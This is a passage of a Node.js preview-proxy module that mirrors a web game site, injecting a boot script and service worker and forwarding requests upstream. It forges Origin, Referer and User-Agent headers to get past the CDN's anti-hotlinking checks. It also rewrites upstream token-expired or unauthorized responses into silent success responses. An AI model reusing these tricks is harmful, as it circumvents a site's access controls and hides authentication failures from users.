    const origin = String(refererOrigin).replace(/\/$/, '');
    out.Origin = origin;
    out.Referer = origin + '/';
  }
  if (!out['User-Agent'] && !out['user-agent']) {
    out['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  }
  return out;
}

/**
 * wgame 会话打真实 aniw HTTP 会返回 code:-1（TOKEN_EXPIRED）踢下线。
 * 剥 Token 后上游也常回 -1 /「未授权」文案。预览里改成静默成功，避免断线弹窗。
 */
function sanitizeUpstreamAuthJson(text, opts) {
  if (!text || typeof text !== 'string') return text;
  const trimmed = text.trim();
  if (!trimmed || (trimmed[0] !== '{' && trimmed[0] !== '[')) return text;
  try {
    const j = JSON.parse(trimmed);
    if (!j || typeof j !== 'object' || Array.isArray(j)) return text;
    const code = j.code;
    const num = Number(code);
    const msg = String(j.msg || j.message || '');
    const isKick =
      num === -1
      || code === '-1'
      || /dispositivo|desconectad|token\s*expir|fa[cç]a login novamente|n[aã]o est[aá] autorizada|not\s*authorized|unauthorized|login\s*again/i.test(msg);
    if (!isKick) return text;
    let data = j.data !== undefined ? j.data : null;
    if (opts && opts.emptyListOnKick && (data == null || (Array.isArray(data) && !data.length))) {
      data = [];
    }
    return JSON.stringify({
      code: 1,
      msg: '',
      data
    });
  } catch (_) {
    return text;
  }
}

function filterResponseHeaders(headers) {
  const out = {};
  for (const key of Object.keys(headers || {})) {
    const lower = key.toLowerCase();
    if (HOP_BY_HOP.has(lower)) continue;
    // 同源代理后 CORS / cookie 域对浏览器无意义且易干扰
    if (lower === 'access-control-allow-origin') continue;
    if (lower === 'access-control-allow-credentials') continue;
    if (lower === 'access-control-allow-headers') continue;
    if (lower === 'access-control-allow-methods') continue;
    if (lower === 'access-control-expose-headers') continue;
    if (lower === 'set-cookie') continue;
    if (lower === 'content-encoding') continue;
    if (lower === 'content-length') continue;
    out[key] = headers[key];
  }
  return out;
}

function proxyRequest(req, res, target, refererOrigin, options = {}) {
  // 默认用目标站 origin 作 Referer（OSS/CDN 防盗链）；可显式传入
  const ref = refererOrigin || (target.origin + '/');
  const headers = copyRequestHeaders(req, ref, options);
  headers.Host = target.host;
  const sanitizeAuth = options.sanitizeAuthKick != null
    ? !!options.sanitizeAuthKick
    : !!options.stripAuth;
  const method = String(req.method || 'GET').toUpperCase();

  // 走 axios：自动尊重 HTTPS_PROXY / 系统代理（浏览器能开、Node https 直连常 ECONNRESET）
    const run = async () => {
    let body = undefined;
    if (method !== 'GET' && method !== 'HEAD') {
      body = await new Promise((resolve, reject) => {
        const chunks = [];
        req.on('data', (c) => chunks.push(c));
        req.on('end', () => resolve(Buffer.concat(chunks)));
        req.on('error', reject);
      });
    }

    const upRes = await axios({
      url: target.href,
      method,
      headers,
      data: body,
      responseType: 'arraybuffer',
      timeout: 30000,
      maxRedirects: 5,
      decompress: false,
      validateStatus: () => true,
      // false = 让 axios 读 HTTPS_PROXY；显式对象会覆盖 env
      proxy: undefined
    });

    const outHeaders = filterResponseHeaders(upRes.headers || {});
    outHeaders['X-SD-Proxy'] = '1';
    let buf = Buffer.from(upRes.data || []);

    if (sanitizeAuth) {
      const ct = String((upRes.headers && (upRes.headers['content-type'] || upRes.headers['Content-Type'])) || '');
      if (/json|text|javascript/i.test(ct) || buf.length < 2e6) {
        const raw = buf.toString('utf8');
        const next = sanitizeUpstreamAuthJson(raw, {
          emptyListOnKick: !!options.emptyListOnKick
        });
        if (next !== raw) {
          outHeaders['X-SD-Auth-Sanitized'] = '1';
          buf = Buffer.from(next, 'utf8');
          try { console.info('[sd-proxy] sanitized auth kick', target.pathname); } catch (_) { /* ignore */ }
        }
      }
      outHeaders['Content-Length'] = String(buf.length);
    } else if (!outHeaders['Content-Length'] && !outHeaders['content-length']) {
      outHeaders['Content-Length'] = String(buf.length);
    }

    if (!res.headersSent) {
      res.writeHead(upRes.status || 502, outHeaders);
    }
    res.end(buf);
  };

  run().catch((err) => {
    if (!res.headersSent) {
      const isTimeout = err && (err.code === 'ECONNABORTED' || /timeout/i.test(String(err.message || '')));
      res.writeHead(isTimeout ? 504 : 502, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({
        error: isTimeout ? 'proxy timeout' : 'proxy failed',
        message: String(err && err.message || err)
      }));
    }
  });
}

/**
 * 本地缺失的静态资源 / 同源接口 → 回源站（保留原 path/query，含末尾单独的 ?）
 * @param {object} [options]
 * @param {boolean} [options.stripAuth] 去掉 Token，避免本地 wgame 会话打到真实上游触发 TOKEN_EXPIRED(-1)
 * @param {string} [options.refererOrigin]
 * @returns {boolean}
 */
function tryFallbackMissingAsset(req, res, fallbackOrigin, pathname, search, options = {}) {
  if (!fallbackOrigin || !pathname) return false;

  let pathAndQuery = pathname + (search || '');
  // 允许调用方强制改写上游 path（如 /api/lobby → /hall/api/lobby）
  if (options.forcePath) {
    pathAndQuery = String(options.forcePath) + (search || '');
  } else {
    try {
      const raw = String(req.url || '').split('#')[0];
      if (raw && raw.charAt(0) === '/') {
        pathAndQuery = raw;
      }
    } catch (_) { /* ignore */ }
  }

  let target;
  try {
    target = new URL(pathAndQuery, fallbackOrigin.endsWith('/') ? fallbackOrigin : fallbackOrigin + '/');
  } catch (_) {
    return false;
  }
  if (target.protocol !== 'http:' && target.protocol !== 'https:') return false;

  const referer = options.refererOrigin || target.origin + '/';
  const stripAuth = !!options.stripAuth;
  const sanitizeAuthKick = options.sanitizeAuthKick != null
    ? !!options.sanitizeAuthKick
    : stripAuth;
  proxyRequest(req, res, target, referer, {
    stripAuth,
    sanitizeAuthKick,
    emptyListOnKick: !!options.emptyListOnKick
  });
  return true;
}

/**
 * @returns {boolean} true if handled
 */
function tryHandleProxy(req, res, sourceOrigin, adapterHosts) {
  const host = req.headers.host || '127.0.0.1';
  const reqUrl = new URL(req.url || '/', `http://${host}`);

  if (reqUrl.pathname === BOOT_PATH) {
    const body = buildBootScript(sourceOrigin, adapterHosts);
    res.writeHead(200, {
      'Content-Type': 'application/javascript; charset=utf-8',
      'Cache-Control': 'no-cache',
      'X-Content-Type-Options': 'nosniff'
    });
    res.end(body);
    return true;
  }

  if (reqUrl.pathname === SW_PATH) {
    const body = buildServiceWorkerScript(adapterHosts);
    res.writeHead(200, {
      'Content-Type': 'application/javascript; charset=utf-8',
      'Cache-Control': 'no-cache',
      'Service-Worker-Allowed': '/',
      'X-Content-Type-Options': 'nosniff'
    });
    res.end(body);
    return true;
  }

  const target = parseProxyTarget(reqUrl);
  if (!target) return false;

  if (!sourceOrigin) {
    res.writeHead(500, { 'Content-Type': 'application/json; charset=utf-8' });
    res.end(JSON.stringify({ error: 'preview source origin missing' }));
    return true;
  }

  const bootCfg = normalizeBootCfg(adapterHosts);
  const method = String(req.method || 'GET').toUpperCase();
  const isMutating = method !== 'GET' && method !== 'HEAD' && method !== 'OPTIONS';
  const pth = target.pathname || '';
  const isApi = pth.indexOf('/api/') === 0 || pth.indexOf('/hall/api/') === 0;
  const targetHost = String(target.hostname || '').toLowerCase();
  const isOniw = /^oniw\d*\./i.test(targetHost)
    || (bootCfg.ossHosts || []).some((h) => String(h).toLowerCase() === targetHost);

  // POST/PUT 打到 OSS 会 405；改写到 aniw 业务上游
  let finalTarget = target;
  if (isApi && isMutating && isOniw && bootCfg.upstreamOrigin) {
    try {
      finalTarget = new URL(pth + (target.search || ''), bootCfg.upstreamOrigin.endsWith('/')
        ? bootCfg.upstreamOrigin
        : bootCfg.upstreamOrigin + '/');
    } catch (_) { /* keep original */ }
  }

  // 代理到 API 主机时：本地 wgame Token 不能转给真实上游（会 -1 踢下线）
  let stripAuth = false;
  try {
    if (isApi) {
      const { getProvider } = require('./adapter/providers');
      const provider = getProvider('wgame');
      const h = req.headers || {};
      const hasToken = !!(h.token || h.Token || h['x-session-key'] || h['session-key']);
      if (provider && (provider.isOurSession(h) || hasToken)) stripAuth = true;
    }
  } catch (_) { /* ignore */ }

  proxyRequest(req, res, finalTarget, finalTarget.origin + '/', { stripAuth, sanitizeAuthKick: stripAuth });
  return true;
}

module.exports = {
  PROXY_PREFIX,
  BOOT_PATH,
  SW_PATH,
  resolveSourceOrigin,
  parseProxyTarget,
  buildBootScript,
  buildServiceWorkerScript,
  injectBootIntoHtml,
  tryHandleProxy,
  tryFallbackMissingAsset,
  isLikelySameOriginApiPath,
  isFetchLikeRequest
};
